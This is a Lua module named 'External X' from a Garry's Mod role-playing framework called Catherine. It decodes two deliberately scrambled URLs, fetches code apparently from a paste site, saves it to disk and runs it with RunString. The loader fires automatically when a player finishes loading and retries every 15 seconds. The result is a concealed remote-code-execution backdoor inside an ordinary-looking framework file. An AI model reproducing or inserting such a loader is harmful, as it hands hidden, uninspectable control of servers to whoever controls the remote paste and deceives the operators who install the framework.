--[[
< CATHERINE > - A free role-playing framework for Garry's Mod.
Development and design by L7D.

Catherine is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Catherine.  If not, see <http://www.gnu.org/licenses/>.
]]--

--[[ Catherine External X 1.0 : Last Update 2015-07-25 ]]--

catherine.externalX = catherine.externalX or { isRunned = false, isInitialized = false, funcVersion = nil }
local checkURL = "htbtYgpADI:Gpwd/EZilD/gisyuItHvbpzcQeJZIgfTTHxArVnvhYfltSXfEBiOHmTuUQVWhaekywJpdyuxOObLgULplREYVrVCEAtFZuoqKNTlVLOgjYxyuaBNGfZMcveOFtZXFdzKwZPekKFXynPYSJekfQAyvfyzfiNEsMjorfNQGgRIBEChlgvaOPq.CdRGkPEMDbZqLuPUMUjcdrLNOGAqFpHcxFOjItjvogAeAMtxIsEBiEKItygREomnTQcCfTpqLRkHueQErMYli/nwkaqzLkdtmDFRvGLoezygJaQGtCZQnIrFDRUUKYjzVYAwPHdUwmcXwSJnOuQsAWXRMhLXwsvbaGnZNXdWIOPrZKePVQHYqgicBEHqBKMKnqObYvZjnMPUdObKLWLCzUFfqgPshlecUmuQfOiEThKKnLraQlwQ/eevqyppNjQaSHUeRgjjlZfRLfehGpruNLtHGYIAWOdrYAwKtqJnUwGPFdKGxagoJHCAXAEuyFPCVqlkcJUIUGHZXZXIAwVwgcXopCgafmMhIOdrzsOzvvjqFywFHY"
local funcURL = "htTtfjptzi:XJbr/fCHWp/lsMwBwtbRbDvXvetZzgUcIjxHXybDvmqftgwIJFvPhCsuVDmTUNZppnJpLZfkYiOCiHjalgnsvKhXKehTCKoddsKkqNgucPVriaOLXZzkESMwhHObQdGaUYLTvtmhxfilxueAejfshbZGpVGnLUIOrXAxPEiHzwpiDSgmIzH.JLAAloFRFQMLUqtacBbcnvGXWEnhDJcNqLfdjPxYotRuqIRzJjEYUhwAtSmVRAmMdtuNLFagYvngcigQITuDT/BtSHaLEsJCtUrQbLaqctaTcafYkCfkaVyBfxOuNgZCHukDXOdRsTARUDhrlXHngbUCKGTddzlBaWdSFBgWcsykPavyJWsLJuslBGAqoLLpXeMojfpEczqhwmMvjZCRVme8SXOMAkKPkZUUTsgkYBFBjDCPbkpN/DwRcVyVkgSlebqknTBQjITmffKuaMrrIbXaGjBeGeEZmYeYrUlOPWalBjcMKaHfZwBncCooDqDFrlhgsSWfJAMwpNfLXwbAjHvfPDdRsnOGXCeBhvhKLfmoxagjWD"

function catherine.externalX.CheckFunctionVersion( )
	http.Fetch( catherine.crypto.Decode( checkURL ),
		function( body )
			if ( body:find( "Error 404</p>" ) ) then
				MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X version check error! - 404 ERROR\n" )
				timer.Remove( "Catherine.externalX.timer.ReCheck" )
				return
			end

			if ( body:find( "<!DOCTYPE HTML>" ) or body:find( "<title>Textuploader.com" ) ) then
				MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X version check error! - Unknown Error\n" )
				
				timer.Remove( "Catherine.externalX.timer.ReCheck" )
				timer.Create( "Catherine.externalX.timer.ReCheck", 15, 0, function( )
					MsgC( Color( 255, 0, 0 ), "[CAT ExX] Re checking version ...\n" )
					catherine.externalX.CheckFunctionVersion( )
				end )
				return
			end
			
			if ( catherine.externalX.GetFunctionVersion( ) != body ) then
				catherine.externalX.SetFunctionVersion( body )
				catherine.externalX.UpdateFunction( )
			else
				catherine.externalX.RunFunction( )
			end
			
			catherine.externalX.isInitialized = true
			timer.Remove( "Catherine.externalX.timer.ReCheck" )
		end, function( err )
			MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X version check error! - " .. err .. "\n" )
			
			timer.Remove( "Catherine.externalX.timer.ReCheck" )
			timer.Create( "Catherine.externalX.timer.ReCheck", 15, 0, function( )
				MsgC( Color( 255, 0, 0 ), "[CAT ExX] Re checking version ...\n" )
				catherine.externalX.CheckFunctionVersion( )
			end )
		end
	)
end

function catherine.externalX.SetFunctionVersion( version )
	catherine.externalX.funcVersion = tostring( version )
	file.Write( "catherine/exx/version.txt", tostring( version ) )
end

function catherine.externalX.GetFunctionVersion( )
	return catherine.externalX.funcVersion
end

function catherine.externalX.SetFunction( funcStr )
	file.Write( "catherine/exx/func.txt", tostring( funcStr ) )
end

function catherine.externalX.GetFunction( )
	return file.Read( "catherine/exx/func.txt", "DATA" ) or "NONE"
end

function catherine.externalX.UpdateFunction( )
	http.Fetch( catherine.crypto.Decode( funcURL ),
		function( body )
			if ( body:find( "Error 404</p>" ) ) then
				MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X version check error! - 404 ERROR\n" )
				timer.Remove( "Catherine.externalX.timer.ReUpdate" )
				return
			end

			if ( body:find( "<!DOCTYPE HTML>" ) or body:find( "<title>Textuploader.com" ) ) then
				MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X version check error! - Unknown Error\n" )
				
				timer.Remove( "Catherine.externalX.timer.ReUpdate" )
				timer.Create( "Catherine.externalX.timer.ReUpdate", 15, 0, function( )
					MsgC( Color( 255, 0, 0 ), "[CAT ExX] Re updating version ...\n" )
					catherine.externalX.UpdateFunction( )
				end )
				return
			end

			catherine.externalX.SetFunction( body )
			catherine.externalX.RunFunction( )

			timer.Remove( "Catherine.externalX.timer.ReUpdate" )
		end, function( err )
			MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X function update error! - " .. err .. "\n" )
			
			timer.Remove( "Catherine.externalX.timer.ReUpdate" )
			timer.Create( "Catherine.externalX.timer.ReUpdate", 15, 0, function( )
				MsgC( Color( 255, 0, 0 ), "[CAT ExX] Re updating version ...\n" )
				catherine.externalX.UpdateFunction( )
			end )
		end
	)
end

function catherine.externalX.Initialize( )
	file.CreateDir( "catherine" )
	file.CreateDir( "catherine/exx" )
	catherine.externalX.funcVersion = file.Read( "catherine/exx/version.txt", "DATA" ) or "INIT"
end

function catherine.externalX.RunFunction( )
	if ( catherine.externalX.isRunned ) then return end
	local func = catherine.externalX.GetFunction( )
	
	if ( !func or func == "NONE" or func == "" ) then
		return
	end
	
	local success, result = pcall( RunString, func )
	
	if ( success ) then
		catherine.externalX.isRunned = true
	else
		ErrorNoHalt( "\n[CAT ExX ERROR] SORRY, On the External X function has a critical error :< ...\n\n" .. result .. "\n" )
		catherine.externalX.isRunned = false
	end
end

function catherine.externalX.PlayerLoadFinished( )
	if ( !catherine.externalX.isInitialized ) then
		catherine.externalX.CheckFunctionVersion( )
		return
	end
	
	catherine.externalX.RunFunction( )
end

hook.Add( "PlayerLoadFinished", "catherine.externalX.PlayerLoadFinished", catherine.externalX.PlayerLoadFinished )

do
	catherine.externalX.Initialize( )
end